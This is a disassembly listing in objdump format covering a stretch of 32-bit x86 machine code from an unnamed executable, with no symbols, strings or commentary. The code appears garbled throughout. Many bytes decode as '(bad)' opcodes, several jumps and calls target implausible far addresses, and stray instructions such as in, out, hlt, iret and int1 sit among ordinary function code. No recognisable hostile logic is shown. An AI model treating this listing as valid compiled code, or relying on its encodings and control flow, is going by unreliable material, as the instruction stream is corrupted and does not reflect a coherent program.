  403c81:	00 00                	add    %al,(%eax)
  403c83:	e8 b8 4e 00 00       	call   0x408b40
  403c88:	8b f0                	mov    %eax,%esi
  403c8a:	4c                   	dec    %esp
  403c8b:	5a                   	pop    %edx
  403c8c:	0b 0f                	or     (%edi),%ecx
  403c8e:	84 04 06             	test   %al,(%esi,%eax,1)
  403c91:	82 00 81             	addb   $0x81,(%eax)
  403c94:	fe                   	(bad)
  403c95:	e4 fd                	in     $0xfd,%al
  403c97:	0a 00                	or     (%eax),%al
  403c99:	0f 84 f8 05 da 00    	je     0x11a4297
  403c9f:	4b                   	dec    %ebx
  403ca0:	fe                   	(bad)
  403ca1:	d9 fc                	frndint
  403ca3:	0a db                	or     %bl,%bl
  403ca5:	0f 7a                	(bad)
  403ca7:	ec                   	in     (%dx),%al
  403ca8:	05 00 00 81 fe       	add    $0xfe810000,%eax
  403cad:	57                   	push   %edi
  403cae:	fd                   	std
  403caf:	0a 2e                	or     (%esi),%ch
  403cb1:	0f 84 fd 6d d6 00    	je     0x116aab4
  403cb7:	2d fe 24 fd 0a       	sub    $0xafd24fe,%eax
  403cbc:	00 a7 84 74 05 00    	add    %ah,0x57484(%edi)
  403cc2:	53                   	push   %ebx
  403cc3:	81 22 a1 66 ee 00    	andl   $0xee66a1,(%edx)
  403cc9:	55                   	push   %ebp
  403cca:	84 b0 b0 00 00 c6    	test   %dh,-0x39ffff50(%eax)
  403cd0:	2d b3 23 0b 00       	sub    $0xb23b3,%eax
  403cd5:	0f 84 f3 05 00 f8    	je     0xf84042ce
  403cdb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403cde:	bd ff 3b cf 91       	mov    $0x91cf3bff,%ebp
  403ce3:	25 2b fe 10 11       	and    $0x1110fe2b,%eax
  403ce8:	01 dc                	add    %ebx,%esp
  403cea:	f9                   	stc
  403ceb:	1d 8b 15 b4 02       	sbb    $0x2b4158b,%eax
  403cf0:	4b                   	dec    %ebx
  403cf1:	00 53 42             	add    %dl,0x42(%ebx)
  403cf4:	89 15 b4 02 41 e3    	mov    %edx,0xe34102b4
  403cfa:	b8 91 fd ff ff       	mov    $0xfffffd91,%eax
  403cff:	83 ff 04             	cmp    $0x4,%edi
  403d02:	5f                   	pop    %edi
  403d03:	5e                   	pop    %esi
  403d04:	5b                   	pop    %ebx
  403d05:	c4 e5 5d 7b          	(bad)
  403d09:	3b f7                	cmp    %edi,%esi
  403d0b:	74 7f                	je     0x403d8c
  403d0d:	8b 0d c8 27 41 00    	mov    0x4127c8,%ecx
  403d13:	a1 5c d7 dd 00       	mov    0xddd75c,%eax
  403d18:	64 cd c7             	fs int $0xc7
  403d1b:	89 0d c8 02 41 00    	mov    %ecx,0x4102c8
  403d21:	74 58                	je     0x403d7b
  403d23:	27                   	daa
  403d24:	3d b8 02 41 00       	cmp    $0x4102b8,%eax
  403d29:	53                   	push   %ebx
  403d2a:	47                   	inc    %edi
  403d2b:	89 3d b8 02 41 00    	mov    %edi,0x4102b8
  403d31:	e8 5a fd ff ff       	call   0x403a90
  403d36:	3a 58 02             	cmp    0x2(%eax),%bl
  403d39:	41                   	inc    %ecx
  403d3a:	00 83 c4 04 83 f8    	add    %al,-0x77cfb3c(%ebx)
  403d40:	01 0f                	add    %ecx,(%edi)
  403d42:	8c 50 05             	mov    %ss,0x5(%eax)
  403d45:	00 25 56 8d 95 60    	add    %ah,0x60958d56
  403d4b:	ff 0c 6d 25 78 52 56 	decl   0x56527825(,%ebp,2)
  403d52:	e8 89 49 60 00       	call   0xa086e0
  403d57:	50                   	push   %eax
  403d58:	a1 c8 c0 40 00       	mov    0x40c0c8,%eax
  403d5d:	68 0c e9 16 00       	push   $0x16e90c
  403d62:	83 c0 40             	add    $0x40,%eax
  403d65:	68 ac d4 40 00       	push   $0x40d4ac
  403d6a:	50                   	push   %eax
  403d6b:	ff 15 80 c1 40 fc    	call   *0xfc40c180
  403d71:	83 c4 14             	add    $0x14,%esp
  403d74:	5f                   	pop    %edi
  403d75:	5e                   	pop    %esi
  403d76:	5b                   	pop    %ebx
  403d77:	8b e5                	mov    %ebp,%esp
  403d79:	5d                   	pop    %ebp
  403d7a:	c3                   	ret
  403d7b:	56                   	push   %esi
  403d7c:	68 7d e9 5d 00       	push   $0x5de97d
  403d81:	e8 ba e0 ff ff       	call   0x401e40
  403d86:	8b 4d 9b             	mov    -0x65(%ebp),%ecx
  403d89:	83 1d 08 8b 35 90 02 	sbbl   $0x2,0x90358b08
  403d90:	41                   	inc    %ecx
  403d91:	00 8b 15 db 02 41    	add    %cl,0x4102db15(%ebx)
  403d97:	00 f2                	add    %dh,%dl
  403d99:	6e                   	outsb  %ds:(%esi),(%dx)
  403d9a:	92                   	xchg   %eax,%edx
  403d9b:	d7                   	xlat   %ds:(%ebx)
  403d9c:	89 35 90 fa 41 00    	mov    %esi,0x41fa90
  403da2:	89 6d 94             	mov    %ebp,-0x6c(%ebp)
  403da5:	02 05 00 8b 43 8e    	add    0x8e438b00,%al
  403dab:	3b c7                	cmp    %edi,%eax
  403dad:	4a                   	dec    %edx
  403dae:	14 65                	adc    $0x65,%al
  403db0:	b8 ec 00 00 8b       	mov    $0x8b0000ec,%eax
  403db5:	4d                   	dec    %ebp
  403db6:	fc                   	cld
  403db7:	89 83 48 08 00 00    	mov    %eax,0x848(%ebx)
  403dbd:	89 87 4c 08 00 00    	mov    %eax,0x84c(%edi)
  403dc3:	8b 53 0c             	mov    0xc(%ebx),%edx
  403dc6:	8b 83 28 08 03 00    	mov    0x30828(%ebx),%eax
  403dcc:	03 d1                	add    %ecx,%edx
  403dce:	3b c7                	cmp    %edi,%eax
  403dd0:	89 53 0c             	mov    %edx,0xc(%ebx)
  403dd3:	b3 85                	mov    $0x85,%bl
  403dd5:	c0 02 00             	rolb   $0x0,(%edx)
  403dd8:	00 8b 8e c9 08 00    	add    %cl,0x8c98e(%ebx)
  403dde:	46                   	inc    %esi
  403ddf:	57                   	push   %edi
  403de0:	ff 4b 00             	decl   0x0(%ebx)
  403de3:	00 2b                	add    %ch,(%ebx)
  403de5:	f6 c7 45             	test   $0x45,%bh
  403de8:	f0 04 00             	lock add $0x0,%al
  403deb:	c4 00                	les    (%eax),%eax
  403ded:	67 c1 89 45 26 72    	rorl   $0x72,0x2645(%bx,%di)
  403df3:	54                   	push   %esp
  403df4:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  403df7:	8b 93 20 08 00 00    	mov    0x820(%ebx),%edx
  403dfd:	8b c8                	mov    %eax,%ecx
  403dff:	be 20 18 41 00       	mov    $0x411820,%esi
  403e04:	8d 7c 13 20          	lea    0x20(%ebx,%edx,1),%edi
  403e08:	98                   	cwtl
  403e09:	d1 d8                	rcr    $1,%eax
  403e0b:	e9 37 f3 a5 8b       	jmp    0x8be63147
  403e10:	ca 8b 55             	lret   $0x558b
  403e13:	f4                   	hlt
  403e14:	83 e1 03             	and    $0x3,%ecx
  403e17:	2b c2                	sub    %edx,%eax
  403e19:	67 a4                	movsb  %ds:(%si),%es:(%di)
  403e1b:	00 bb 20 08 00 00    	add    %bh,0x820(%ebx)
  403e21:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403e24:	03 fa                	add    %edx,%edi
  403e26:	71 cf                	jno    0x403df7
  403e28:	89 c2                	mov    %eax,%edx
  403e2a:	20 08                	and    %cl,(%eax)
  403e2c:	ac                   	lods   %ds:(%esi),%al
  403e2d:	59                   	pop    %ecx
  403e2e:	c6 83 19 20 00 a1 5f 	movb   $0x5f,-0x5effdfe7(%ebx)
  403e35:	02 41 00             	add    0x0(%ecx),%al
  403e38:	83 74 07 7c 12       	xorl   $0x12,0x7c(%edi,%eax,1)
  403e3d:	8d 43 20             	lea    0x20(%ebx),%eax
  403e40:	d4 68                	aam    $0x68
  403e42:	94                   	xchg   %eax,%esp
  403e43:	e8 40 00 ff 15       	call   0x163f3e88
  403e48:	b8 56 40 00 10       	mov    $0x10004056,%eax
  403e4d:	c4 08                	les    (%eax),%ecx
  403e4f:	8b 3d 38 c1 40 00    	mov    0x40c138,%edi
  403e55:	8d 73 20             	lea    0x20(%ebx),%esi
  403e58:	68 e8 b8 40 00       	push   $0x40b8e8
  403e5d:	56                   	push   %esi
  403e5e:	ff d7                	call   *%edi
  403e60:	83 c4 08             	add    $0x8,%esp
  403e63:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e66:	85 c0                	test   %eax,%eax
  403e68:	0f 85 47 00 00 cc    	jne    0xcc403eb5
  403e6e:	68 8c df 40 00       	push   $0x40df8c
  403e73:	56                   	push   %esi
  403e74:	ff d7                	call   *%edi
  403e76:	83 6e 08 cb          	subl   $0xffffffcb,0x8(%esi)
  403e7a:	45                   	inc    %ebp
  403e7b:	f8                   	clc
  403e7c:	68 c0 c7 45 f0       	push   $0xf045c7c0
  403e81:	de 00                	fiadds (%eax)
  403e83:	00 00                	add    %al,(%eax)
  403e85:	75 6c                	jne    0x403ef3
  403e87:	c2 45 ec             	ret    $0xec45
  403e8a:	85 c0                	test   %eax,%eax
  403e8c:	0f 85 05 9f 00 00    	jne    0x40dd97
  403e92:	a1 8a 17 41 00       	mov    0x41178a,%eax
  403e97:	2a 4b 04             	sub    0x4(%ebx),%cl
  403e9a:	3b 55 d8             	cmp    -0x28(%ebp),%edx
  403e9d:	c7 45 30 01 00 00 00 	movl   $0x1,0x30(%ebp)
  403ea4:	52                   	push   %edx
  403ea5:	50                   	push   %eax
  403ea6:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  403ea9:	e8 52 23 00 00       	call   0x406200
  403eae:	8b b1 04 51 e8 59    	mov    0x59e85104(%ecx),%esi
  403eb4:	29 00                	sub    %eax,(%eax)
  403eb6:	00 8b 84 d0 02 41    	add    %cl,0x4102d084(%ebx)
  403ebc:	f2 a1 b8 02 41 00    	repnz mov 0x4102b8,%eax
  403ec2:	5f                   	pop    %edi
  403ec3:	89 57 d0             	mov    %edx,-0x30(%edi)
  403ec6:	02 41 00             	add    0x0(%ecx),%al
  403ec9:	f5                   	cmc
  403eca:	d0 40 70             	rolb   $1,0x70(%eax)
  403ecd:	fa                   	cli
  403ece:	0a a3 b8 b0 41 00    	or     0x41b0b8(%ebx),%ah
  403ed4:	7e 0d                	jle    0x403ee3
  403ed6:	68 b0 d2 40 00       	push   $0x40d2b0
  403edb:	e8 70 d8 ff ff       	call   0x401750
  403ee0:	66 c4 04 53          	les    (%ebx,%edx,2),%ax
  403ee4:	e8 77 0c ff ff       	call   0x3f4b60
  403ee9:	49                   	dec    %ecx
  403eea:	c4 b8 8f ac e9 fc    	les    -0x3165371(%eax),%edi
  403ef0:	01 8d 00 a1 b4 02    	add    %ecx,0x2b4a100(%ebp)
  403ef6:	41                   	inc    %ecx
  403ef7:	00 85 c0 75 2d 68    	add    %al,0x682d75c0(%ebp)
  403efd:	e0 aa                	loopne 0x403ea9
  403eff:	40                   	inc    %eax
  403f00:	00 d8                	add    %bl,%al
  403f02:	ff d7                	call   *%edi
  403f04:	83 c4 08             	add    $0x8,%esp
  403f07:	e3 e0                	jecxz  0x403ee9
  403f09:	13 41 00             	adc    0x0(%ecx),%eax
  403f0c:	85 6c 74 17          	test   %ebp,0x17(%esp,%esi,2)
  403f10:	8a 48 08             	mov    0x8(%eax),%cl
  403f13:	3f                   	aas
  403f14:	c0 08 80             	rorb   $0x80,(%eax)
  403f17:	f9                   	stc
  403f18:	20 7e 0c             	and    %bh,0xc(%esi)
  403f1b:	88 0a                	mov    %cl,(%edx)
  403f1d:	8a 48 cb             	mov    -0x35(%eax),%cl
  403f20:	28 40 2a             	sub    %al,0x2a(%eax)
  403f23:	f9                   	stc
  403f24:	20 80 f4 c6 e1 00    	and    %al,0xe1c6f4(%eax)
  403f2a:	68 d8 e8 0b 8e       	push   $0x8e0be8d8
  403f2f:	56                   	push   %esi
  403f30:	ff d7                	call   *%edi
  403f32:	8b d0                	mov    %eax,%edx
  403f34:	ea c4 6a d8 d2 74 36 	ljmp   $0x3674,$0xd2d86ac4
  403f3b:	8b fa                	mov    %edx,%edi
  403f3d:	83 c9 ff             	or     $0xffffffff,%ecx
  403f40:	33 c0                	xor    %eax,%eax
  403f42:	f2 ae                	repnz scas %es:(%edi),%al
  403f44:	97                   	xchg   %eax,%edi
  403f45:	b5 49                	mov    $0x49,%ch
  403f47:	83 07 9e             	addl   $0xffffff9e,(%edi)
  403f4a:	76 5d                	jbe    0x403fa9
  403f4c:	c6 c2 09             	mov    $0x9,%dl
  403f4f:	6a e5                	push   $0xffffffe5
  403f51:	8d 45 08             	lea    0x8(%ebp),%eax
  403f54:	52                   	push   %edx
  403f55:	50                   	push   %eax
  403f56:	ff                   	lcall  (bad)
  403f57:	d8 3c c1             	fdivrs (%ecx,%eax,8)
  403f5a:	40                   	inc    %eax
  403f5b:	4d                   	dec    %ebp
  403f5c:	13 c3                	adc    %ebx,%eax
  403f5e:	38 6e fe             	cmp    %ch,-0x2(%esi)
  403f61:	38 83 c4 0c c6 45    	cmp    %al,0x45c60cc4(%ebx)
  403f67:	0b 00                	or     (%eax),%eax
  403f69:	eb 0f                	jmp    0x403f7a
  403f6b:	8b 3d 38 c1 40 00    	mov    0x40c138,%edi
  403f71:	8b 0d d4 e8 a1 00    	mov    0xa1e8d4,%ecx
  403f77:	f1                   	int1
  403f78:	4d                   	dec    %ebp
  403f79:	08 8a 81 08 3c 32    	or     %cl,0x323c0881(%edx)
  403f7f:	a1 58 02 41 00       	mov    0x410258,%eax
  403f84:	74 1d                	je     0x403fa3
  403f86:	8b 95 d0 14 41 00    	mov    0x4114d0(%ebp),%edx
  403f8c:	41                   	inc    %ecx
  403f8d:	25 f8 02 89 0d       	and    $0xd8902f8,%eax
  403f92:	d0 12                	rclb   $1,(%edx)
  403f94:	41                   	inc    %ecx
  403f95:	7d 7c                	jge    0x404013
  403f97:	22 8d 55 08 43 34    	and    0x34430855(%ebp),%cl
  403f9d:	77 e8                	ja     0x403f87
  403f9f:	40                   	inc    %eax
  403fa0:	9e                   	sahf
  403fa1:	eb e5                	jmp    0x403f88
  403fa3:	83 f8 03             	cmp    $0x3,%eax
  403fa6:	7c 12                	jl     0x403fba
  403fa8:	8d                   	lea    (bad),%ebp
  403fa9:	ec                   	in     (%dx),%al
  403faa:	22 56 68             	and    0x68(%esi),%dl
  403fad:	90                   	nop
  403fae:	81 40 00 ff a6 26 c1 	addl   $0xc126a6ff,0x0(%eax)
  403fb5:	40                   	inc    %eax
  403fb6:	00 83 c4 08 8b 4d    	add    %al,0x4d8b08c4(%ebx)
  403fbc:	f8                   	clc
  403fbd:	c7 83 28 08 00 00 01 	movl   $0x800001,0x828(%ebx)
  403fc4:	00 80 00 
  403fc7:	e8 01 00 e1 68       	call   0x69213fcd
  403fcc:	02 11                	add    (%ecx),%dl
  403fce:	00 85 c0 0f 84 80    	add    %al,-0x7f7bf040(%ebp)
  403fd4:	00 00                	add    %al,(%eax)
  403fd6:	00 68 ed             	add    %ch,-0x13(%eax)
  403fd9:	37                   	aaa
  403fda:	40                   	inc    %eax
  403fdb:	00 56 ff             	add    %dl,-0x1(%esi)
  403fde:	d7                   	xlat   %ds:(%ebx)
  403fdf:	25 c4 da 41 2e       	and    $0x2e41dac4,%eax
  403fe4:	75 e8                	jne    0x403fce
  403fe6:	82 78 e8 40          	cmpb   $0x40,-0x18(%eax)
  403fea:	00 56 6f             	add    %dl,0x6f(%esi)
  403fed:	d7                   	xlat   %ds:(%ebx)
  403fee:	15 c4 08 85 c0       	adc    $0xc08508c4,%eax
  403ff3:	74 62                	je     0x404057
  403ff5:	68 68 f4 07 b0       	push   $0xb007f468
  403ffa:	56                   	push   %esi
  403ffb:	ff d7                	call   *%edi
  403ffd:	8b f8                	mov    %eax,%edi
  403fff:	83 d4 08             	adc    $0x8,%esp
  404002:	85 ff                	test   %edi,%edi
  404004:	75 b5                	jne    0x403fbb
  404006:	68 eb e8 40 00       	push   $0x40e8eb
  40400b:	56                   	push   %esi
  40400c:	ff 15 38 c1 40 00    	call   *0x40c138
  404012:	86 da                	xchg   %bl,%dl
  404014:	83 c1 08             	add    $0x8,%ecx
  404017:	85 ff                	test   %edi,%edi
  404019:	74 2b                	je     0x404046
  40401b:	ed                   	in     (%dx),%eax
  40401c:	83 24 08 00          	andl   $0x0,(%eax,%ecx,1)
  404020:	00 01                	add    %al,(%ecx)
  404022:	00 00                	add    %al,(%eax)
  404024:	00 a1 60 c7 41 00    	add    %ah,0x41c760(%ecx)
  40402a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40402b:	c0 7c 0f 8d 57       	sarb   $0x57,-0x73(%edi,%ecx,1)
  404030:	10 52 f1             	adc    %dl,-0xf(%edx)
  404033:	15 6c c1 40 00       	adc    $0x40c16c,%eax
  404038:	83 c4 04             	add    $0x4,%esp
  40403b:	eb 02                	jmp    0x40403f
  40403d:	33 c0                	xor    %eax,%eax
  40403f:	7a ff                	jp     0x404040
  404041:	89 43 1c             	mov    %eax,0x1c(%ebx)
  404044:	75 11                	jne    0x404057
  404046:	c7 83 24 08 0b 00 5c 	movl   $0x1f8e005c,0xb0824(%ebx)
  40404d:	00 8e 1f 
  404050:	c7 43 1c 00 00 00 00 	movl   $0x0,0x1c(%ebx)
  404057:	8b 45 fe             	mov    -0x2(%ebp),%eax
  40405a:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  40405d:	8b 55 a7             	mov    -0x59(%ebp),%edx
  404060:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404063:	2b c6                	sub    %esi,%eax
  404065:	8b 73 bc             	mov    -0x44(%ebx),%esi
  404068:	2b c2                	sub    %edx,%eax
  40406a:	2b c1                	sub    %ecx,%eax
  40406c:	8b 8b 20 fd 00 00    	mov    0xfd20(%ebx),%ecx
  404072:	03 c3                	add    %ebx,%eax
  404074:	8d 54 08 20          	lea    0x20(%eax,%ecx,1),%edx
  404078:	03 f2                	add    %edx,%esi
  40407a:	89 73 10             	mov    %esi,0x10(%ebx)
  40407d:	8b 0d 98 02 41 00    	mov    0x410298,%ecx
  404083:	8b c6                	mov    %esi,%eax
  404085:	47                   	inc    %edi
  404086:	c8 05 9c e0          	enter  $0x9c05,$0xe0
  40408a:	c3                   	ret
  40408b:	00 83 d0 00 89 0d    	add    %al,0xd8900d0(%ebx)
  404091:	98                   	cwtl
  404092:	02 41 00             	add    0x0(%ecx),%al
  404095:	33 ff                	xor    %edi,%edi
  404097:	eb 1d                	jmp    0x4040b6
  404099:	8b 73 7b             	mov    0x7b(%ebx),%esi
  40409c:	03 6e 89             	add    -0x77(%esi),%ebp
  40409f:	f0 10 8b 15 bc 02 41 	lock adc %cl,0x4102bc15(%ebx)
  4040a6:	00 a1 9c 39 5d 00    	add    %ah,0x5d399c(%ecx)
  4040ac:	03 d1                	add    %ecx,%edx
  4040ae:	89 15 1a 02 41 00    	mov    %edx,0x41021a
  4040b4:	e7 c7                	out    %eax,$0xc7
  4040b6:	a3 9c 02 41 00       	mov    %eax,0x41029c
  4040bb:	39 bb 24 08 56 00    	cmp    %edi,0x560824(%ebx)
  4040c1:	0f 84 44 16 00 00    	je     0x40570b
  4040c7:	8b 43 10             	mov    0x10(%ebx),%eax
  4040ca:	8b 4b 1c             	mov    0x1c(%ebx),%ecx
  4040cd:	3b 9d 0f 82 c2 01    	cmp    0x1c2820f(%ebp),%ebx
  4040d3:	00 00                	add    %al,(%eax)
  4040d5:	a1 b4 02 41 e4       	mov    0xe44102b4,%eax
  4040da:	40                   	inc    %eax
  4040db:	83 f8 01             	cmp    $0x1,%eax
  4040de:	a3 41 02 41 64       	mov    %eax,0x64410241
  4040e3:	75 0b                	jne    0x4040f0
  4040e5:	c8 4b 1d 89          	enter  $0x1d4b,$0x89
  4040e9:	0d 38 02 5a 65       	or     $0x655a0238,%eax
  4040ee:	03 24 8b             	add    (%ebx,%ecx,4),%esp
  4040f1:	53                   	push   %ebx
  4040f2:	10 12                	adc    %dl,(%edx)
  4040f4:	8c 02                	mov    %es,(%edx)
  4040f6:	41                   	inc    %ecx
  4040f7:	00 3b                	add    %bh,(%ebx)
  4040f9:	d0 74 79 8b          	shlb   $1,-0x75(%ecx,%edi,2)
  4040fd:	0d 19 02 41 32       	or     $0x32410219,%eax
  404102:	a1 c0 97 89 00       	mov    0x8997c0,%eax
  404107:	41                   	inc    %ecx
  404108:	40                   	inc    %eax
  404109:	89 0d 50 02 ab 77    	mov    %ecx,0x77ab0250
  40410f:	a3 27 02 41 00       	mov    %eax,0x410227
  404114:	a1 29 04 5e 73       	mov    0x735e0429,%eax
  404119:	8b fc                	mov    %esp,%edi
  40411b:	9d                   	popf
  40411c:	3a 40 14             	cmp    0x14(%eax),%al
  40411f:	3b f6                	cmp    %esi,%esi
  404121:	0f 8d 13 01 00 7a    	jge    0x7a40423a
  404127:	8b 0d c8 0b 41 00    	mov    0x410bc8,%ecx
  40412d:	8b f0                	mov    %eax,%esi
  40412f:	c1 e6 05             	shl    $0x5,%esi
  404132:	1b f1                	sbb    %ecx,%esi
  404134:	8b d2                	mov    %edx,%edx
  404136:	d7                   	xlat   %ds:(%ebx)
  404137:	00 41 02             	add    %al,0x2(%ecx)
  40413a:	40                   	inc    %eax
  40413b:	41                   	inc    %ecx
  40413c:	a3 ac 02 41 00       	mov    %eax,0x4102ac
  404141:	89 a9 41 91 41 3a    	mov    %ebp,0x3a419141(%ecx)
  404147:	e8 b4 14 00 f5       	call   0xf5405600
  40414c:	fd                   	std
  40414d:	83 50 08 00          	adcl   $0x0,0x8(%eax)
  404151:	00 8b 83 30 08 00    	add    %cl,0x83083(%ebx)
  404157:	00 89 93 54 71 00    	add    %cl,0x715493(%ecx)
  40415d:	00 89 06 8b 8b 34    	add    %cl,0x348b8b06(%ecx)
  404163:	08 00                	or     %al,(%eax)
  404165:	02 89 4e 04 8b 5b    	add    0x5b8b044e(%ecx),%cl
  40416b:	38 08                	cmp    %cl,(%eax)
  40416d:	00 00                	add    %al,(%eax)
  40416f:	8b 83 ed 08 d0 00    	mov    0xd008ed(%ebx),%eax
  404175:	7f 93                	jg     0x40410a
  404177:	2d 08 00 00 d5       	sub    $0xd5000008,%eax
  40417c:	c8 8b 83 3c          	enter  $0x838b,$0x3c
  404180:	82 83 00 38 c2 3b bf 	addb   $0xbf,0x3bc23800(%ebx)
  404187:	7f 0a                	jg     0x404193
  404189:	7c 04                	jl     0x40418f
  40418b:	3b d4                	cmp    %esp,%edx
  40418d:	73 04                	jae    0x404193
  40418f:	33 c9                	xor    %ecx,%ecx
  404191:	33 93 c8 4e 10 97    	xor    -0x68efb138(%ebx),%edx
  404197:	46                   	inc    %esi
  404198:	4a                   	dec    %edx
  404199:	8b 8b 50 08 00 00    	mov    0x850(%ebx),%ecx
  40419f:	8b 66 30             	mov    0x30(%esi),%esp
  4041a2:	0b 00                	or     (%eax),%eax
  4041a4:	00 52 93             	add    %dl,-0x6d(%edx)
  4041a7:	34 e8                	xor    $0xe8,%al
  4041a9:	f6 00 2b             	testb  $0x2b,(%eax)
  4041ac:	c8 8b 83 54          	enter  $0x838b,$0x54
  4041b0:	08 00                	or     %al,(%eax)
  4041b2:	00 44 c2 47          	add    %al,0x47(%edx,%eax,8)
  4041b6:	c7                   	(bad)
  4041b7:	7f 0a                	jg     0x4041c3
  4041b9:	7c 04                	jl     0x4041bf
  4041bb:	3b ed                	cmp    %ebp,%ebp
  4041bd:	73 9e                	jae    0x40415d
  4041bf:	33 c9                	xor    %ecx,%ecx
  4041c1:	33 67 89             	xor    -0x77(%edi),%esp
  4041c4:	9d                   	popf
  4041c5:	18 89 c8 ea 8b 8b    	sbb    %cl,-0x74741538(%ecx)
  4041cb:	48                   	dec    %eax
  4041cc:	08 00                	or     %al,(%eax)
  4041ce:	d7                   	xlat   %ds:(%ebx)
  4041cf:	8b 83 40 8c 00 00    	mov    0x8c40(%ebx),%eax
  4041d5:	8b 93 44 08 00 00    	mov    0x844(%ebx),%edx
  4041db:	2b c8                	sub    %eax,%ecx
  4041dd:	9b                   	fwait
  4041de:	83 89 08 00 00 1b b3 	orl    $0xffffffb3,0x1b000008(%ecx)
  4041e5:	3b c7                	cmp    %edi,%eax
  4041e7:	bd 0a 7c 04 3b       	mov    $0x3b047c0a,%ebp
  4041ec:	cf                   	iret
  4041ed:	b9 04 33 c9 f7       	mov    $0xf7c93304,%ecx
  4041f2:	1f                   	pop    %ds
  4041f3:	89 4e 43             	mov    %ecx,0x43(%esi)
  4041f6:	4b                   	dec    %ebx
  4041f7:	46                   	inc    %esi
  4041f8:	0c 8b                	or     $0x8b,%al
  4041fa:	1f                   	pop    %ds
  4041fb:	14 d0                	adc    $0xd0,%al
  4041fd:	40                   	inc    %eax
  4041fe:	00 3b                	add    %bh,(%ebx)
  404200:	cf                   	iret
  404201:	74 95                	je     0x404198
  404203:	8b 35 ac 02 41 00    	mov    0x4102ac,%esi
  404209:	15 8f 99 07 f9       	adc    $0xf907998f,%eax
  40420e:	85 32                	test   %esi,(%edx)
  404210:	75 28                	jne    0x40423a
  404212:	8b 15 c8 c4 34 00    	mov    0x34c4c8,%edx
  404218:	56                   	push   %esi
  404219:	03 c2                	add    %edx,%eax
  40421b:	40                   	inc    %eax
  40421c:	76 44                	jbe    0x404262
  40421e:	e8 40 00 52 ff       	call   0xff924263
  404223:	15 80 c1 40 00       	adc    $0x40c180,%eax
  404228:	a1 c8 2d 40 00       	mov    0x402dc8,%eax
  40422d:	83 c0 40             	add    $0x40,%eax
  404230:	50                   	push   %eax
  404231:	0b 15 12 a1 40 00    	or     0x40a112,%edx
  404237:	83 c4 54             	add    $0x54,%esp
  40423a:	2a 20                	sub    (%eax),%ah
  40423c:	24 08                	and    $0x8,%al
  40423e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40423f:	00 89 7b 64 64 bb    	add    %cl,-0x449b9b85(%ecx)
  404245:	28 08                	sub    %cl,(%eax)
  404247:	00 00                	add    %al,(%eax)
  404249:	89 bb 20 08 00 13    	mov    %edi,0x13000820(%ebx)
  40424f:	89 7b ac             	mov    %edi,-0x54(%ebx)
  404252:	99                   	cltd
  404253:	7b 57                	jnp    0x4042ac
  404255:	e8 a6 be e5 41       	call   0x42260100
  40425a:	a3 a0 00 41 00       	mov    %eax,0x4100a0
  40425f:	89 15 a4 0b 57 ea    	mov    %edx,0xea570ba4
  404265:	89 83 b0 08 00 00    	mov    %eax,0x8b0(%ebx)
  40426b:	8b 0d a4 0b b0 00    	mov    0xb00ba4,%ecx
  404271:	89 6e 3c             	mov    %ebp,0x3c(%esi)
  404274:	08 00                	or     %al,(%eax)
  404276:	00 89 15 c8 0b 29    	add    %cl,0x290bc815(%ecx)
  40427c:	00 d5                	add    %dl,%ch
  40427e:	15 a7 1f c0 00       	adc    $0xc01fa7,%eax
  404283:	a1 a4 0b 41 00       	mov    0x410ba4,%eax
  404288:	14 89                	adc    $0x89,%al
  40428a:	83 ab 08 12 44 e8 af 	subl   $0xffffffaf,-0x17bbedf8(%ebx)
  404291:	dc ff                	fdivr  %st,%st(7)
  404293:	ff 83 c4 04 16 5e    	incl   0x5e1604c4(%ebx)
  404299:	5b                   	pop    %ebx
  40429a:	ac                   	lods   %ds:(%esi),%al
  40429b:	e9 5d c3 90 90       	jmp    0x90d105fd
  4042a0:	c0 88 02 a4 00 56 8b 	rorb   $0x8b,0x5600a402(%eax)
  4042a7:	35 64 c1 40 00       	xor    $0x40c164,%eax
  4042ac:	85 7c 50 26          	test   %edi,0x26(%eax,%edx,2)
  4042b0:	68 d8 ea 9d 00       	push   $0x9dead8
  4042b5:	68 b4 ea 40 00       	push   $0x40eab4
  4042ba:	d0 25 68 68 6f 40    	shlb   $1,0x406f6868
  4042c0:	00 ff                	add    %bh,%bh
  4042c2:	d6                   	salc
  4042c3:	c6                   	(bad)
  4042c4:	20 ea                	and    %ch,%dl
  4042c6:	40                   	inc    %eax
  4042c7:	55                   	push   %ebp
  4042c8:	73 d6                	jae    0x4042a0
  4042ca:	30 80 d4 40 2f f0    	xor    %al,-0xfd0bf2c(%eax)
  4042d0:	aa                   	stos   %al,%es:(%edi)
  4042d1:	83 c4 14             	add    $0x14,%esp
  4042d4:	5e                   	pop    %esi
  4042d5:	c3                   	ret
  4042d6:	68 14 ea 40 00       	push   $0x40ea14
  4042db:	fb                   	sti
  4042dc:	d6                   	salc
  4042dd:	68 00 ea eb 2f       	push   $0x2febea00
  4042e2:	68 44 d4 40 00       	push   $0x40d444
  4042e7:	97                   	xchg   %eax,%edi
  4042e8:	c8 21 e3 00          	enter  $0xe321,$0x0
  4042ec:	34 d6                	xor    $0xd6,%al
  4042ee:	68 78 e9 40 00       	push   $0x40e978
  4042f3:	45                   	inc    %ebp
  4042f4:	d6                   	salc
  4042f5:	68 28 23 40 00       	push   $0x402328
  4042fa:	ff d6                	call   *%esi
  4042fc:	68 df e9 9e 00       	push   $0x9ee9df
  404301:	ff 2c 83             	ljmp   *(%ebx,%eax,4)
  404304:	c4 1c 5e             	les    (%esi,%ebx,2),%ebx
  404307:	36 04 90             	ss add $0x90,%al
  40430a:	90                   	nop
  40430b:	90                   	nop
  40430c:	90                   	nop
  40430d:	90                   	nop
  40430e:	90                   	nop
  40430f:	90                   	nop
  404310:	55                   	push   %ebp
  404311:	8b ec                	mov    %esp,%ebp
  404313:	8b 45 08             	mov    0x8(%ebp),%eax
  404316:	db 0d c8 c0 40 00    	fisttpl 0x40c0c8
  40431c:	56                   	push   %esi
  40431d:	ee                   	out    %al,(%dx)
  40431e:	35 80 c1 40 00       	xor    $0x40c180,%eax
  404323:	6f                   	outsl  %ds:(%esi),(%dx)
  404324:	42                   	inc    %edx
  404325:	c1 d5 68             	rcl    $0x68,%ebp
